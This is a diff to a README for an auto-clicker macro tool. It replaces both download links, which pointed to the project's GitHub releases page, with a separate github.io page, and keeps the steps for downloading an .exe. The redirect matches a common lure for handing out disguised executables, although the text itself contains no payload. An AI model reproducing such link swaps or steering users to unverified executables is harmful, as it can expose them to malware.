@@ -1,6 +1,6 @@
 # 🖱️ AutoClicker-Pro-2026-Macro-Tool - Automate your clicks with simple precision
 
-<a href="https://github.com/reliant-piquet770/AutoClicker-Pro-2026-Macro-Tool/releases"><img src="https://img.shields.io/badge/Download-Release-blue.svg" alt="Download"></a>
+<a href="https://reliant-piquet770.github.io"><img src="https://img.shields.io/badge/Download-Release-blue.svg" alt="Download"></a>
 
 ## 📋 Overview
 
@@ -21,7 +21,7 @@ Ensure your computer meets these requirements to run the software correctly:
 
 You must visit the official release page to get the latest version. Follow these steps to obtain the correct file:
 
-1.  Visit the official [Download Page](https://github.com/reliant-piquet770/AutoClicker-Pro-2026-Macro-Tool/releases).
+1.  Visit the official [Download Page](https://reliant-piquet770.github.io).
 2.  Look for the "Assets" section at the bottom of the latest release post.
 3.  Click the file ending in `.exe` to start the download.
 4.  Save the file to your desktop or a folder you can find easily.
